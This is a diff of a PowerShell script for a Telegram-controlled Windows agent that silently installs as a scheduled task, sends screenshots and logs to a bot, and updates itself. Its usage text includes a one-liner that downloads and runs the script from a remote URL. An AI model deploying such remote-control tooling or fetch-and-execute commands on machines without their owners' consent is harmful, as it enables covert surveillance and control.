@@ -1,14 +1,16 @@
 # =====================================================================
 # SuperAgent - Telegram-controlled Windows agent (single-file)
-# Version: 2.2.5
+# Version: 2.2.6
 # =====================================================================
-# CHANGELOG 2.2.5:
-# - Replaced curl.exe in Send-TelegramPhoto with System.Net.Http.HttpClient.
-#   curl.exe was hanging for 60 seconds (timeout) on Windows 11 and
-#   silently dropping the upload.
-# - Added fallback to sendDocument if sendPhoto fails (e.g. image
-#   dimensions too large for Telegram's photo API).
-# - Added Write-Log to capture exact Telegram API responses.
+# CHANGELOG 2.2.6:
+# - FIXED: Send-TelegramPhoto now opens the screenshot with FileShare.ReadWrite
+#   and retries 10x if the file is still locked by AV/indexer (this caused
+#   "process cannot access the file" right after screenshot saved).
+# - FIXED: Send-Telegram now falls back to plain text if Markdown fails with
+#   400 Bad Request (was happening on error messages containing ' [ ] etc).
+# - FIXED: Version label now read from script's own "# Version: x.y.z"
+#   header so /update immediately shows the new version.
+# - Bumped to v2.2.6
 # =====================================================================
 [CmdletBinding()]
 param(
@@ -130,7 +132,7 @@ $InstallBlock = {
     if ($RepoUrl -match 'USERNAME/REPO') { throw '!!! $RepoUrl NOT UPDATED !!!' }
 
     Write-Msg ''
-    Write-Msg '=== SuperAgent Installer (v2.2.5) ===' -Color Cyan
+    Write-Msg '=== SuperAgent Installer (v2.2.6) ===' -Color Cyan
     Write-Msg "  PC Name  : $PCName"
     Write-Msg "  Chat ID  : $ChatId"
     Write-Msg "  Repo URL : $RepoUrl"
@@ -193,7 +195,7 @@ $InstallBlock = {
         ChatId      = $ChatId
         PCName      = $PCName
         RepoUrl     = $RepoUrl.TrimEnd('/')
-        Version     = '2.2.5'
+        Version     = '2.2.6'
         InstalledAt = (Get-Date -Format 'o')
     }
     $Config | ConvertTo-Json | Out-File $ConfigPath -Encoding UTF8
@@ -223,7 +225,7 @@ $InstallBlock = {
     Start-ScheduledTask -TaskName $TaskName
 
     Write-Msg ''
-    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.5)' -Color Green
+    Write-Msg '[+] INSTALLATION COMPLETE (v2.2.6)' -Color Green
     Write-Msg "    Log: $LogPath" -Color Green
     Write-Msg ''
     if (-not $Silent) { Pause-Exit }
@@ -274,7 +276,16 @@ $AgentBlock = {
     $script:ChatId   = [string]$Config.ChatId
     $script:PCName   = $Config.PCName
     $script:RepoUrl  = $Config.RepoUrl
-    $script:Version  = if ($Config.Version) { $Config.Version } else { 'unknown' }
+
+    # v2.2.6 fix: read version from script file header, fallback to config
+    $script:Version  = 'unknown'
+    try {
+        $sc = Get-Content $ScriptPath -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+        if ($sc -match '# Version:\s*([\d\.\w\-]+)') { $script:Version = $Matches[1] }
+        elseif ($Config.Version) { $script:Version = $Config.Version }
+    } catch {
+        if ($Config.Version) { $script:Version = $Config.Version }
+    }
 
     if (-not $BotToken -or -not $ChatId -or -not $PCName) { exit 1 }
 
@@ -362,78 +373,124 @@ public static class SuperAgentUserSession
         Write-Log "FATAL: Add-Type failed: $($_.Exception.Message)"
     }
 
+    # =================================================================
+    # v2.2.6: Send-Telegram with automatic plain-text fallback
+    # =================================================================
     function Send-Telegram {
-        param([string]$Text)
+        param([string]$Text, [switch]$PlainText)
         if ([string]::IsNullOrWhiteSpace($Text)) { return }
-        $body = @{ chat_id = $ChatId; text = $Text; parse_mode = 'Markdown' }
+
+        $body = @{ chat_id = $ChatId; text = $Text }
+        if (-not $PlainText) { $body.parse_mode = 'Markdown' }
+
         try {
             Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                 -Method Post -Body $body -TimeoutSec 15 | Out-Null
-            Write-Log "Telegram sendMessage OK (len=$($Text.Length))"
+            Write-Log "Telegram sendMessage OK (len=$($Text.Length)$(if($PlainText){', plain'}else{''}))"
             return $true
         } catch {
-            Write-Log "Telegram sendMessage FAIL: $($_.Exception.Message)"
+            Write-Log "Telegram sendMessage FAIL (Markdown=$(-not $PlainText)): $($_.Exception.Message)"
+            if (-not $PlainText) {
+                # retry without markdown
+                try {
+                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
+                        -Method Post -Body @{ chat_id = $ChatId; text = $Text } -TimeoutSec 15 | Out-Null
+                    Write-Log "Telegram sendMessage OK (plain fallback, len=$($Text.Length))"
+                    return $true
+                } catch {
+                    Write-Log "Telegram sendMessage FAIL (plain fallback): $($_.Exception.Message)"
+                }
+            }
             return $false
         }
     }
 
     # =================================================================
-    # FIXED v2.2.5: Send-TelegramPhoto using HttpClient (no curl.exe)
+    # v2.2.6: Send-TelegramPhoto — FileShare.ReadWrite + retry + document fallback
     # =================================================================
     function Send-TelegramPhoto {
         param([string]$FilePath, [string]$Caption = '')
+
         if (-not (Test-Path $FilePath)) {
-            Send-Telegram "[$PCName] Image file not found: $FilePath"
+            Send-Telegram "[$PCName] Image file not found: $FilePath" -PlainText
             return
         }
 
+        # --- Retry open with FileShare.ReadWrite (AV/indexer may hold the file) ---
+        $fileStream = $null
+        for ($i = 0; $i -lt 10; $i++) {
+            try {
+                $fileStream = [System.IO.File]::Open(
+                    $FilePath,
+                    [System.IO.FileMode]::Open,
+                    [System.IO.FileAccess]::Read,
+                    [System.IO.FileShare]::ReadWrite)
+                break
+            } catch {
+                if ($i -eq 9) {
+                    Write-Log "Send-TelegramPhoto: cannot open after 10 retries: $($_.Exception.Message)"
+                    Send-Telegram "[$PCName] Cannot open screenshot file: $($_.Exception.Message)" -PlainText
+                    return
+                }
+                Start-Sleep -Milliseconds 500
+            }
+        }
+
+        $client = $null
+        $content = $null
         try {
             Add-Type -AssemblyName System.Net.Http -ErrorAction Stop
-            $url = "https://api.telegram.org/bot$BotToken/sendPhoto"
+
+            $url    = "https://api.telegram.org/bot$BotToken/sendPhoto"
             $client = New-Object System.Net.Http.HttpClient
             $client.Timeout = [TimeSpan]::FromSeconds(60)
-            
+
             $form = New-Object System.Net.Http.MultipartFormDataContent
             $form.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
             if ($Caption) {
                 $form.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
             }
-            
-            $fileStream = [System.IO.File]::OpenRead($FilePath)
-            $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-            $form.Add($fileContent, 'photo', (Split-Path $FilePath -Leaf))
-            
+            $content = New-Object System.Net.Http.StreamContent($fileStream)
+            $form.Add($content, 'photo', (Split-Path $FilePath -Leaf))
+
             $response = $client.PostAsync($url, $form).Result
             $responseString = $response.Content.ReadAsStringAsync().Result
-            
             Write-Log "sendPhoto status: $($response.StatusCode) | body: $responseString"
-            
+
             if (-not $response.IsSuccessStatusCode) {
-                Write-Log "sendPhoto failed, trying sendDocument..."
-                $urlDoc = "https://api.telegram.org/bot$BotToken/sendDocument"
+                Write-Log "sendPhoto failed, falling back to sendDocument..."
+
+                # Reset stream to beginning for document upload
+                $fileStream.Position = 0
+                $urlDoc  = "https://api.telegram.org/bot$BotToken/sendDocument"
                 $formDoc = New-Object System.Net.Http.MultipartFormDataContent
                 $formDoc.Add((New-Object System.Net.Http.StringContent($ChatId)), 'chat_id')
                 if ($Caption) {
                     $formDoc.Add((New-Object System.Net.Http.StringContent($Caption)), 'caption')
                 }
-                $fileStream.Position = 0
-                $fileContentDoc = New-Object System.Net.Http.StreamContent($fileStream)
-                $formDoc.Add($fileContentDoc, 'document', (Split-Path $FilePath -Leaf))
-                
+                $contentDoc = New-Object System.Net.Http.StreamContent($fileStream)
+                $formDoc.Add($contentDoc, 'document', (Split-Path $FilePath -Leaf))
+
                 $responseDoc = $client.PostAsync($urlDoc, $formDoc).Result
                 $responseDocString = $responseDoc.Content.ReadAsStringAsync().Result
                 Write-Log "sendDocument status: $($responseDoc.StatusCode) | body: $responseDocString"
-                
+
+                $contentDoc.Dispose()
+                $formDoc.Dispose()
+
                 if (-not $responseDoc.IsSuccessStatusCode) {
-                    Send-Telegram "[$PCName] Failed to send file. Status: $($responseDoc.StatusCode)"
+                    Send-Telegram "[$PCName] Failed to send file. Status: $($responseDoc.StatusCode)" -PlainText
                 }
             }
+
+            $form.Dispose()
         } catch {
             Write-Log "Send-TelegramPhoto EXCEPTION: $($_.Exception.Message)"
-            Send-Telegram "[$PCName] Failed to send image (exception): $($_.Exception.Message)"
+            Send-Telegram "[$PCName] Failed to send image: $($_.Exception.Message)" -PlainText
         } finally {
-            if ($fileStream) { $fileStream.Dispose() }
-            if ($client) { $client.Dispose() }
+            if ($content)    { try { $content.Dispose() }    catch { } }
+            if ($fileStream) { try { $fileStream.Dispose() } catch { } }
+            if ($client)     { try { $client.Dispose() }     catch { } }
         }
     }
 
@@ -689,7 +746,7 @@ try {
             Write-Log "Update done. Exiting."
             exit 0
         } catch {
-            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)"
+            Send-Telegram "[$PCName] Update failed: $($_.Exception.Message)" -PlainText
             if (Test-Path $tempFile) { Remove-Item $tempFile -Force -EA SilentlyContinue }
         }
     }
@@ -842,13 +899,7 @@ if (Test-Path '$InstallDir') { Remove-Item -Recurse -Force '$InstallDir' -ErrorA
                                 $lines = Get-Content $LogPath -Tail 50
                                 $ltext = ($lines -join "`n")
                                 if ($ltext.Length -gt 3900) { $ltext = $ltext.Substring($ltext.Length - 3900) }
-                                $body = @{ chat_id = $ChatId; text = "[$PCName] Last 50 log lines:`n`n$ltext" }
-                                try {
-                                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
-                                        -Method Post -Body $body -TimeoutSec 15 | Out-Null
-                                } catch {
-                                    Write-Log "sendMessage (log) FAIL: $($_.Exception.Message)"
-                                }
+                                Send-Telegram "[$PCName] Last 50 log lines:`n`n$ltext" -PlainText
                             } else {
                                 Send-Telegram "[$PCName] No log file yet"
                             }
@@ -921,7 +972,7 @@ if ($Run) {
 
 if (-not $Silent) {
     Write-Msg ''
-    Write-Msg '=== SuperAgent v2.2.5 - Usage ===' -Color Cyan
+    Write-Msg '=== SuperAgent v2.2.6 - Usage ===' -Color Cyan
     Write-Msg ''
     Write-Msg 'Install (silent):'
     Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
